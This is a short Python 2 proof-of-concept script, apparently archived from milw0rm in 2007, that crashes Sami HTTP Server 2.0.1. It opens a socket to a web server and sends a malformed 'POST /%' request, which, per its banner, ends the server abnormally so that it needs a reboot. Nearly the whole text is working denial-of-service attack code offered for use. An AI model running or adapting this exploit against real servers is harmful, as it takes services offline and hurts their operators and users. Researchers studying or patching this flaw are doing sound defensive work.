# usr/bin/python

import socket

print
"-------------------------------------------------------------------------"
print " Sami HTTP Server 2.0.1 POST request Denial of Service"
print " url: http://www.karjasoft.com"
print " author: shinnai"
print " mail: shinnai[at]autistici[dot]org"
print " site: http://shinnai.altervista.org"
print " Sending to the webserver a 'POST /%' will cause an abnormal
termination"
print " of the program that requires the reboot of the webserver."
print
"-------------------------------------------------------------------------"

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   conn = s.connect(("127.0.0.1",80))
   s.send("POST /% HTTP/1.0 \n\n")
except:
   print "Unable to connect. exiting."

# milw0rm.com [2007-04-12]
